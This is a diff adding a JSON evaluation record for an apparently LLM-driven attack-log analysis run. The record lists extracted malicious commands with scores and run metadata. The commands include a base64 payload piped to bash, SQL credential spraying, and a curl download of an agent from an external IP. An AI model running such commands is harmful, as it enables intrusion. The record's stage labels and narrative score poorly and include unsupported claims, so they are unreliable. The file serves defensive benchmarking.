@@ -1,0 +1,84 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c 'echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash'",
+        "stage": "Execution"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "python -m SimpleHTTPServer 8079",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "ssh -D -R",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "run-parts --report /etc/cron.hourly",
+        "stage": "Persistence"
+      },
+      {
+        "command": "50-motd-news --force",
+        "stage": "Persistence"
+      },
+      {
+        "command": "logrotate /etc/logrotate.conf",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "Attackers infiltrate the system by executing a decoded payload. They leverage known SQL credentials for further exploitation, deploy persistence mechanisms like modified cronjobs and updated MOTD messages. Defense mechanisms are bypassed by altering GPG key trust paths, allowing unsigned packages to be installed. Initial commands suggest assessing the environment, while subsequent steps indicate setup for remote access and data collection.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 49295,
+      "completion_tokens": 6815,
+      "total_tokens": 56110,
+      "wall_clock_s": 62.421,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.2857142857142857,
+      "f1": 0.26666666666666666,
+      "tp": 2,
+      "fp": 6,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 8,
+      "fn": 7,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 49295,
+      "completion_tokens": 6815,
+      "total_tokens": 56110,
+      "wall_clock_s": 62.421,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
